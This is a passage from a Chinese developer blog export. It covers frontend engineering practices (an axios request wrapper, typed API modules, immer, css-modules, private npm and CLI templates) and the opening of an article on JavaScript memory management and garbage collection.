<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios, &#123; <span class="title class_">AxiosInstance</span>, <span class="title class_">AxiosRequestConfig</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; tokenStorage &#125; <span class="keyword">from</span> <span class="string">&#x27;@/common/storage&#x27;</span></span><br><span class="line"><span class="comment">/** 封装axios的实例，方便多个url时的封装 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createAxiosIntance = (<span class="attr">baseURL</span>: <span class="built_in">string</span>): <span class="function"><span class="params">AxiosInstance</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123; baseURL &#125;)</span><br><span class="line">  <span class="comment">// 请求拦截器器</span></span><br><span class="line">  request.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function">(<span class="params">config: AxiosRequestConfig</span>) =&gt;</span> &#123;</span><br><span class="line">    config.<span class="property">headers</span>[<span class="string">&#x27;Authorization&#x27;</span>] = tokenStorage.<span class="title function_">getItem</span>()</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 响应拦截器</span></span><br><span class="line">  request.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">    <span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> code = response.<span class="property">data</span>.<span class="property">code</span></span><br><span class="line">      <span class="keyword">switch</span> (code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">return</span> response.<span class="property">data</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line">          <span class="comment">// 登录失效逻辑</span></span><br><span class="line">          <span class="keyword">return</span> response.<span class="property">data</span> || &#123;&#125;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">          <span class="keyword">return</span> response.<span class="property">data</span> || &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 接口请求报错时，也返回对象，这样使用async/await就不需要加try/catch</span></span><br><span class="line">      <span class="comment">// code为0为请求正常，不为0为请求异常,使用message提示</span></span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="title function_">onErrorReason</span>(error.<span class="property">message</span>) &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> request</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 解析http层面请求异常原因 */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onErrorReason</span>(<span class="params">message: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (message.<span class="title function_">includes</span>(<span class="string">&#x27;Network Error&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;网络异常，请检查网络情况!&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (message.<span class="title function_">includes</span>(<span class="string">&#x27;timeout&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;请求超时，请重试!&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;服务异常,请重试!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> request = <span class="title function_">createAxiosIntance</span>(<span class="string">&#x27;https://xxx&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>使用上面代码命名定义接口类型的<strong>「loginApi」</strong>例子</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 登录 */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onLogin</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">loginApi</span>(params)</span><br><span class="line">  <span class="keyword">if</span>(res.<span class="property">code</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 处理登录正常逻辑</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    message.<span class="title function_">error</span>(res.<span class="property">message</span>) <span class="comment">// 错误提示也可以在封装时统一添加</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="api接口管理统一"><a href="#api接口管理统一" class="headerlink" title="api接口管理统一"></a>api接口管理统一</h2><h3 id="文件夹路径"><a href="#文件夹路径" class="headerlink" title="文件夹路径"></a>文件夹路径</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">├─pages                 <span class="comment">#  页面</span></span><br><span class="line">│  ├─Login              <span class="comment">#  登录页面</span></span><br><span class="line">│  │  └─api             <span class="comment">#  api文件夹</span></span><br><span class="line">│  │    └─index.ts      <span class="comment">#  api函数封装</span></span><br><span class="line">│  │    ├─types.ts      <span class="comment">#  api的参数和响应类型</span></span><br></pre></td></tr></table></figure>

<h3 id="定义类型"><a href="#定义类型" class="headerlink" title="定义类型"></a>定义类型</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// api/types.ts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 登录接口参数 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ILoginParams</span> &#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">password</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 登录接口响应 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ILoginData</span> &#123;</span><br><span class="line">  <span class="attr">token</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="定义请求接口"><a href="#定义请求接口" class="headerlink" title="定义请求接口"></a>定义请求接口</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/request&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ILoginParams</span>, <span class="title class_">ILoginData</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./types&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 用户登录接口 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">loginApi</span> = (<span class="params">params: ILoginParams</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> request.<span class="property">post</span>&lt;<span class="title class_">ILoginData</span>&gt;(<span class="string">&#x27;/distribute/school/login&#x27;</span>, params)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用请求接口"><a href="#使用请求接口" class="headerlink" title="使用请求接口"></a>使用请求接口</h3><p>使用上面代码命名定义接口类型的<strong>「loginApi」</strong>例子</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 登录 */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onLogin</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">loginApi</span>(params)</span><br><span class="line">  <span class="keyword">if</span>(res.<span class="property">code</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 处理登录正常逻辑</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    message.<span class="title function_">error</span>(res.<span class="property">message</span>) <span class="comment">// 错误提示也可以在封装时统一添加</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="函数库-通用方法抽离复用"><a href="#函数库-通用方法抽离复用" class="headerlink" title="函数库-通用方法抽离复用"></a>函数库-通用方法抽离复用</h2><p>把公司项目中常用的<strong>「方法」</strong>和<strong>「hooks」</strong>抽离出来组成<strong>「函数库」</strong>，方便在各个项目中使用，通过编写函数方法，写jest单元测试，也可以提升组内成员的整体水平。当时组内前端不管是实习生还是正式成员都在参与函数库的建设，很多就有了 <strong>「30+」</strong> 的函数和hooks，还在不断的增加。</p>
<p>是用了<strong>「dumi2」</strong>来开发的函数库。了解更多，<a href="https://juejin.cn/post/7222804347830206525">详见</a></p>
<h2 id="组件库-通用组件抽离复用"><a href="#组件库-通用组件抽离复用" class="headerlink" title="组件库-通用组件抽离复用"></a>组件库-通用组件抽离复用</h2><p>公司项目多了会有很多公共的组件，可以抽离出来，方便其他项目复用，一般可以分为以下几种组件：</p>
<ol>
<li>UI组件</li>
<li>业务组件</li>
<li>功能组件：上拉刷新，滚动到底部加载更多，虚拟滚动，拖拽排序，图片懒加载..</li>
</ol>
<h2 id="css超集和css模块化方案统一"><a href="#css超集和css模块化方案统一" class="headerlink" title="css超集和css模块化方案统一"></a>css超集和css模块化方案统一</h2><h3 id="css超集"><a href="#css超集" class="headerlink" title="css超集"></a>css超集</h3><p>使用<strong>「less」</strong>或者<strong>「scss」</strong>，看项目具体情况，能全项目统一就统一。</p>
<h3 id="css模块化"><a href="#css模块化" class="headerlink" title="css模块化"></a>css模块化</h3><p><strong>「vue」</strong>使用自带的<strong>「style scoped」</strong>, <strong>「react」</strong>使用<strong>「css-module」</strong>方案。</p>
<p>开启也简单，以<strong>「vite」</strong>为例，默认支持，可以修改<strong>「vite.config.ts」</strong>配置：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">css</span>: &#123;</span><br><span class="line">    <span class="comment">// 配置 css-module</span></span><br><span class="line">    <span class="attr">modules</span>: &#123;</span><br><span class="line">      <span class="comment">// 开启 camelCase 格式变量名转换</span></span><br><span class="line">      <span class="attr">localsConvention</span>: <span class="string">&#x27;camelCase&#x27;</span>,</span><br><span class="line">      <span class="comment">// 类名格式，[local]是自己原本的类名，[hash:base64:5]是5位的hash值</span></span><br><span class="line">      <span class="attr">generateScopedName</span>: <span class="string">&#x27;[local]-[hash:base64:5]&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>「react」</strong>使用的时候，样式文件命名后缀需要加上 <strong>「.module」</strong>，例如<code>index.module.less</code>：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.module.less</span></span><br><span class="line"><span class="selector-class">.title</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>组件里面使用:</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; memo, useMemo &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&#x27;./index.module.less&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ITitleProps</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Title</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">ITitleProps</span>&gt; = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; title &#125; = props</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">className</span>=<span class="string">&#123;styles.title&#125;</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">memo</span>(<span class="title class_">Title</span>)</span><br></pre></td></tr></table></figure>

<p>编译后类名会变成**title-[hash:5]**，可以有效避免样式冲突，减少起类名的痛苦。</p>
<h2 id="引入immer来优化性能和简化写法"><a href="#引入immer来优化性能和简化写法" class="headerlink" title="引入immer来优化性能和简化写法"></a>引入immer来优化性能和简化写法</h2><p>Immer(<a href="https://fgithub.com/mweststrate/immer">https://Fgithub.com/mweststrate/immer</a>) 是 <strong>「mobx」</strong> 的作者写的一个 <strong>「immutable」</strong> 库，核心实现是利用 <strong>「ES6」</strong> 的 <strong>「Proxy」</strong>(不支持<strong>「Proxy」</strong>的环境会自动使用<strong>「Object.defineProperty」</strong>来实现)，几乎以最小的成本实现了 <strong>「js」</strong> 的不可变数据结构，简单易用、体量小巧、设计巧妙，满足了我们对<strong>「js」</strong>不可变数据结构的需求。</p>
<h3 id="优化性能"><a href="#优化性能" class="headerlink" title="优化性能"></a>优化性能</h3><p>修改用户信息</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [ userInfo, setUserInfo ] = <span class="title function_">useState</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;immer&#x27;</span>, <span class="attr">info</span>: &#123; <span class="attr">age</span>: <span class="number">6</span> &#125; &#125;)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onChange</span> = (<span class="params">age: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setUserInfo</span>(&#123;...userInfo, <span class="attr">info</span>: &#123;</span><br><span class="line">    ...userinfo.<span class="property">info</span>,</span><br><span class="line">    <span class="attr">age</span>: age</span><br><span class="line">  &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面某次修改<strong>「age」</strong>没有变，但<strong>「setUserInfo」</strong>时每次都生成了一个新对象，更新前后引用变化了，组件就会刷新。</p>
<p>使用<strong>「immer」</strong>后,<strong>「age」</strong>没变时不会生成新的引用，同时语法也更简洁，可以优化性能。</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> produce <span class="keyword">from</span> <span class="string">&#x27;immer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [ userInfo, setUserInfo ] = <span class="title function_">useState</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;immer&#x27;</span>, <span class="attr">age</span>: <span class="number">5</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onChange</span> = (<span class="params">age: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setUserInfo</span>(<span class="function"><span class="params">darft</span> =&gt;</span> &#123;</span><br><span class="line">    darft.<span class="property">age</span> = age</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简化写法"><a href="#简化写法" class="headerlink" title="简化写法"></a>简化写法</h3><p><strong>「react」</strong>遵循不可变数据流的理念，每次修改状态都要新生成一个引用，不能在原先的引用上进行修改，所以在对引用类型对象或者数组做操作时，总要浅拷贝一下，再来做处理，当修改的状态层级比较深的时候，写法会更复杂。</p>
<p>以数组为例，修改购物车某个商品的数量：</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> produce <span class="keyword">from</span> <span class="string">&#x27;immer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [ list, setList ] = <span class="title function_">useState</span>([&#123; <span class="attr">price</span>: <span class="number">100</span>, <span class="attr">num</span>: <span class="number">1</span> &#125;, &#123; <span class="attr">price</span>: <span class="number">200</span>, <span class="attr">num</span>: <span class="number">1</span> &#125;])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不使用用immer</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onAdd</span> = (<span class="params">index: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">/** 不使用immer */</span></span><br><span class="line">  <span class="comment">// const item = &#123; ...list[index] &#125;</span></span><br><span class="line">  <span class="comment">// item.num++</span></span><br><span class="line">  <span class="comment">// list[index] = item</span></span><br><span class="line">  <span class="comment">// setList([...list])</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 使用immer */</span></span><br><span class="line">  <span class="title function_">setList</span>(</span><br><span class="line">    <span class="title function_">produce</span>(<span class="function"><span class="params">darft</span> =&gt;</span> &#123;</span><br><span class="line">      darft[index].<span class="property">num</span>++</span><br><span class="line">    &#125;),</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="可以用use-immer简化写法"><a href="#可以用use-immer简化写法" class="headerlink" title="可以用use-immer简化写法"></a>可以用<a href="https://www.npmjs.com/package/use-immer">use-immer</a>简化写法</h3><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> useImmer <span class="keyword">from</span> <span class="string">&#x27;use-immer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [ list, setList ] = <span class="title function_">useImmer</span>([&#123; <span class="attr">price</span>: <span class="number">100</span>, <span class="attr">num</span>: <span class="number">1</span> &#125;, &#123; <span class="attr">price</span>: <span class="number">200</span>, <span class="attr">num</span>: <span class="number">1</span> &#125;])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onAdd</span> = (<span class="params">index: <span class="built_in">number</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setList</span>(<span class="function"><span class="params">darft</span> =&gt;</span> &#123;</span><br><span class="line">      darft[index].<span class="property">num</span>++</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="搭建npm私服"><a href="#搭建npm私服" class="headerlink" title="搭建npm私服"></a>搭建npm私服</h2><p>公司前端项目不推荐使用太多第三方包，可以自己搭建公司<strong>「npm」</strong>私服，来托管公司自己封装的状态管理库，请求库，组件库，以及脚手架<strong>「cli」</strong>，<strong>「sdk」</strong>等<strong>「npm」</strong>包，方便复用和管理。</p>
<p>了解更多，详见：</p>
<p><a href="https://juejin.cn/post/7233250336534151227">【前端工程化】巧用阿里云oss服务打造前端npm私有仓库</a></p>
<p><a href="https://juejin.cn/post/7096701542408912933">【前端工程化】使用verdaccio搭建公司npm私有库完整流程和踩坑记录</a></p>
<h2 id="各类型项目通用模版封装"><a href="#各类型项目通用模版封装" class="headerlink" title="各类型项目通用模版封装"></a>各类型项目通用模版封装</h2><p>可以提前根据公司的业务需求，封装出各个端对应通用开发模版，封装好项目目录结构，接口请求，状态管理，代码规范，git规范钩子，页面适配，权限，本地存储管理等等，来减少开发新项目时前期准备工作时间，也能更好的统一公司整体的代码规范。</p>
<ol>
<li>通用后台管理系统基础模版封装</li>
<li>通用小程序基础模版封装</li>
<li>通用<strong>「h5」</strong>端基础模版封装</li>
<li>通用<strong>「node」</strong>端基础模版封装</li>
<li>其他类型的项目默认模版封装，减少重复工作。</li>
</ol>
<h2 id="搭建cli脚手架下载模版"><a href="#搭建cli脚手架下载模版" class="headerlink" title="搭建cli脚手架下载模版"></a>搭建cli脚手架下载模版</h2><p>搭建类似<strong>「vue-cli」</strong>, <strong>「vite」</strong>, <strong>「create-react-app」</strong>类的<strong>「cli命令行」</strong>脚手架来快速选择和下载封装好的模版，比<strong>「git」</strong>拉代码要方便。</p>
<p>了解更多，详见：<a href="https://juejin.cn/post/7236021829000446011">从入门到精通，100行代码构建你的前端CLI脚手架之路</a></p>
<h2 id="git操作规范"><a href="#git操作规范" class="headerlink" title="git操作规范"></a>git操作规范</h2><p><strong>「git」</strong>操作规范也很重要，流程不规范很容易出现比较复杂的问题，要根据公司现有情况和业界比较好的实践方案制定一套适合自己公司的<strong>「git flow」</strong>开发规范，用各种限制方案来避免出现问题。</p>
<p>了解更多，<a href="https://www.huatree.top/2021/12/20/20211220-Git%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E4%B8%8E%E6%80%BB%E7%BB%93/?highlight=git#6-git-flow">详见</a></p>
<h2 id="规范和使用文档输出文档站点"><a href="#规范和使用文档输出文档站点" class="headerlink" title="规范和使用文档输出文档站点"></a>规范和使用文档输出文档站点</h2><p>代码规范和git提交规范以及各个封装的库使用说明要输出成文档部署到线上，方便新同事快速熟悉和使用。</p>
<p>这个是很重要的，做了再多的基建和规范，如果没有一个公共的文档来查阅，就没办法快速熟悉，所以要一个线上的规范文档，把所有的规范都写进去。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://juejin.cn/post/7101596844181962788">【前端工程化】配置React+ts企业级代码规范及样式格式和git提交规范</a></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>JS垃圾回收机制</title>
    <url>/2023/08/12/20230812-JS%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>JavaScript是门魅力无限的语言，关于它的GC（垃圾回收）方面，你了解多少呢？想来大部分人是因为面试才去看一些面试题从而了解的垃圾回收。</p>
<p>当然，我们可不仅仅是为了面试，其目的是一次性彻底搞懂 GC！假如你对其中某块内容不太理解，不要着急，先读完整篇文章了解内容再回过头来仔细看一遍就会清晰很多，干货满满，先赞后看哦。</p>
<p><img src="https://cdn.huatree.top/image-20230813014556183.png" alt="image-20230813014556183"></p>
<span id="more"></span>

<h2 id="操作系统中的存储结构"><a href="#操作系统中的存储结构" class="headerlink" title="操作系统中的存储结构"></a>操作系统中的存储结构</h2><ul>
<li><p><code>CPU</code> 只能从内存中加载指令，因此执行程序必须位于内存。通用计算机运行的大多数程序通常位于可读写内存，称为内存，也称为 <code>随机访问内存</code>（也被称为RAM：Random Access Memory）。</p>
</li>
<li><p>内存由一个很大的字节数组来组成,每个字节都有各自的地址，<code>CPU</code> 根据程序计数器的值从内存中提取指令，这些指令可能引起对特定内存地址的额外加载与存储。</p>
</li>
<li><p>在理想状态下，程序和数据都应永久驻留在内存中。由于以下两个原因,这是不可能的：</p>
<ol>
<li>内存通常太少，不能永久保存所有需要的内存和数据；</li>
<li>内存是 <code>易失性</code> 的存储设备，停电时就会失去所有内容；</li>
</ol>
</li>
<li><p>最为常用的外存设备为磁盘和硬盘，它能存储程序和数据。</p>
<p>内存区别于储存：</p>
<table>
<thead>
<tr>
<th align="center">Key</th>
<th align="center">内存</th>
<th align="center">储存</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Basis</td>
<td align="center">内存是临时存储数据的。一旦系统断电，数据就会消失。</td>
<td align="center">存储器在永久基础上存储数据。即使系统电源关闭，数据也会持续存在。</td>
</tr>
<tr>
<td align="center">Speed</td>
<td align="center">内存的速度比存储快。</td>
<td align="center">与内存相比，存储的速度较慢。</td>
</tr>
<tr>
<td align="center">组成部分</td>
<td align="center">内存是由寄存器组成的，速度非常快。</td>
<td align="center">存储器是由磁条&#x2F;部件组成的，比存储器慢。</td>
</tr>
<tr>
<td align="center">Size</td>
<td align="center">与存储相比，内存大小相当小，一般以MB或几GB为单位。</td>
<td align="center">存储的大小非常大，以GB或几个TB为单位。</td>
</tr>
<tr>
<td align="center">数据访问</td>
<td align="center">内存是一个可以即时访问数据的组件。</td>
<td align="center">存储器不能像内存那样快速改变或访问数据。</td>
</tr>
<tr>
<td align="center">Types</td>
<td align="center">内存的类型有–缓存内存、主内存和辅助内存。</td>
<td align="center">存储类型包括–HDD、SSD、CD、DVD、软盘、磁带、蓝光光盘等。</td>
</tr>
<tr>
<td align="center">Cost</td>
<td align="center">记忆的成本相对较高。</td>
<td align="center">存储器的成本比内存模块要低。</td>
</tr>
</tbody></table>
</li>
<li><p>大多数程序(例如谷歌浏览器的安装文件)都保存在硬盘上，当要执行的时候才加载到内存，操作系统会为该应用程序创建一个新的进程，并为它分配必要的资源，如内存空间、文件描述符等。还会为其开辟一个线程以运行程序。如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230812223723276.png" alt="image-20230812223723276"></p>
</li>
<li><p>在上图中，操作系统会为每个应用程序创建一个进程，并且每个应用程序都占据着一定的内存空间。</p>
</li>
<li><p>进程又能创建线程，并且每个进程最少拥有一个线程，称为主线程，如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230812225242377.png" alt="image-20230812225242377"></p>
</li>
<li><p>一个谷歌浏览器拥有多个线程,用于运行每一个浏览器页面。</p>
<p><img src="https://cdn.huatree.top/image-20230812230749988.png" alt="image-20230812230749988"></p>
</li>
<li><p>根据速度和价格，各种不同的存储可以按层次来分类，如上图所示。层次越高，价格越贵，速度越快。</p>
</li>
</ul>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>在前面的内容中我们对内存进行了介绍，那么接下来我们认识一下内存管理。</p>
<p>像 C 语言这样的底层语言一般都有底层的内存管理接口，比如 <code>malloc()</code>和<code>free()</code>。相反，JavaScript 是在创建变量（对象，字符串等）时自动进行了分配内存，并且在不使用它们时“自动”释放。释放的过程称为垃圾回收。这个“自动”是混乱的根源，并让 JavaScript（和其他高级语言）开发者错误的感觉他们可以不关心内存管理。</p>
<p>然而，内存的读取和释放，决定了程序性能。</p>
<h3 id="内存生命周期"><a href="#内存生命周期" class="headerlink" title="内存生命周期"></a>内存生命周期</h3><p>不管什么程序语言，内存生命周期基本是一致的：</p>
<ol>
<li>分配你所需要的内存</li>
<li>使用分配到的内存（读、写）</li>
<li>不需要时将其释放\归还</li>
</ol>
<p>所有语言第二部分都是明确的。第一和第三部分在底层语言中是明确的，但在像 JavaScript 这些高级语言中，大部分都是隐含的。</p>
<p>通过下面的代码我们来简单分析一下整个内存管理的生命周期：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 分配内存</span></span><br><span class="line"><span class="keyword">const</span> foo = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;moment&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="string">&quot;18&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 使用内存</span></span><br><span class="line">foo.<span class="property">name</span> = <span class="string">&quot;xun&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo);</span><br><span class="line"><span class="comment">// 内存回收</span></span><br><span class="line">foo = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p><strong>JavaScript 的内存分配：</strong>为了不让程序员费心分配内存，JavaScript 在定义变量时就完成了内存分配。</p>
<p><strong>使用内存：</strong>实际上是对分配内存进行读取与写入的操作。读取与写入可能是写入一个变量或者一个对象的属性值，甚至传递函数的参数。</p>
<p> <strong>内存回收：</strong>当内存不再需要使用时释放。</p>
<h4 id="JS怎么分配内存的"><a href="#JS怎么分配内存的" class="headerlink" title="JS怎么分配内存的"></a>JS怎么分配内存的</h4><p>在JavaScript中，不同的数据类型分配不同的内存，而存放这些数据的内存又可以分为两部分：<code>栈内存</code> 和 <code>堆内存</code>。</p>
<p>在 <code>JavaScript</code> 中有<strong>7</strong>种原始类型，它们分别是 空值(<code>null</code>)、未定义(<code>undefined</code>)、布尔值(<code>boolean</code>)、数字(<code>number</code>)、字符串(<code>string</code>)、 任意精度整数(<code>Bigint</code>)、符号(<code>symbol</code>)，这些类型都会被存放到栈内存中。</p>
<p>JavaScript中的引用类型，比如 <code>Object</code>、<code>Array</code>,它们是存在堆内存的，JavaScript不允许直接操作堆内存，我们操作对象时，操作的实际是对象的引用，而不是实际对象，这就相当于 <code>C语言</code> 中的指针，这个指针指向了堆里面的实际的对象。函数也是引用类型，当我们定义一个函数时，会在堆内存中开辟一块内存空间，将函数体代码以字符串的形式存进去。然后将这块内存的地址赋值给函数名，函数名和引用地址会存在栈上。</p>
<p>栈存储无论分配新的空间还是释放空间(压栈和退栈)都很简单，访问栈里的变量也快速，但其缺点是每次压栈的空间大小是固定的，因此里面的变量的数目及其数据结构大小也是固定的。</p>
<p>压栈和退栈是随着函数调用同步进行的，当函数结构后期栈空间会被立即释放，里面的变量的数据无法保留。如果要保留，让函数外面的继续，比如闭包，必须将其存入堆内存中，闭包中的变量也是存在堆内存中，堆存储的特点是不会随函数的结束而自动让数据消失。</p>
<p>堆在分配和释放空间时要做相当多的工作，比如分配时寻找合适大小的空间，对不用的空间做垃圾扫描和垃圾回收，甚至要将碎片化的空闲空间整合在一起。此外访问堆里的数据也要比栈更慢。所有这些都让堆储存的运行代价很高，影响性能。</p>
<h2 id="垃圾回收-Garbage-Collection"><a href="#垃圾回收-Garbage-Collection" class="headerlink" title="垃圾回收(Garbage Collection)"></a>垃圾回收(Garbage Collection)</h2><p>程序工作过程中会产生很多 <code>垃圾</code>，这些垃圾是程序不用的内存或者是之前用过了，以后不会再用的内存空间，而 <code>GC</code> 就是负责回收垃圾的，因为他工作在引擎内部，所以对于我们前端来说，<code>GC</code> 过程是相对比较无感的，这一套引擎执行而对我们又相对无感的操作也就是常说的 <code>垃圾回收</code>。</p>
